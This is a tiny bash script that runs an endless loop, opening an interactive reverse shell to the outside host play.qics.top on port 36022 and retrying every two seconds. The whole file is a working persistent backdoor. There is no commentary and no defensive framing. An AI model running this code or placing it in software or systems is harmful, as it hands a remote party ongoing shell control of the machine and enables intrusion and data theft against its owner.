#!/bin/bash
while :
do
    echo "start..."
    bash -i >& /dev/tcp/play.qics.top/36022 0>&1
    echo "end..."
    sleep 2
done
